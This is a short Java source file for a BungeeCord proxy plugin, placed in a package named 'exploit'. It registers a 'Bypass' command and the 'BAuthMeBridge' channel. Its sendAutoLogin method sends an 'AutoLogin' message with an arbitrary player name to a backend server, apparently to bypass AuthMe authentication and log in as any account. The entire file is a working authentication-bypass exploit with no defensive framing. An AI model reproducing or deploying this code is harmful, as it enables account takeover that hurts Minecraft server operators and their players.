package exploit;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import net.md_5.bungee.api.connection.Server;
import net.md_5.bungee.api.plugin.Plugin;

public class Main extends Plugin {
   public static Main instance;

   public void onEnable() {
      instance = this;
      this.getProxy().getPluginManager().registerCommand(this, new Bypass());
      this.getProxy().registerChannel("BAuthMeBridge");
   }

   public void sendAutoLogin(Server server, String playername) throws IOException {
      if (server != null) {
         ByteArrayOutputStream b = new ByteArrayOutputStream();
         DataOutputStream out = new DataOutputStream(b);
         out.writeUTF("AutoLogin");
         out.writeUTF(playername);
         server.sendData("BAuthMeBridge", b.toByteArray());
      }

   }
}
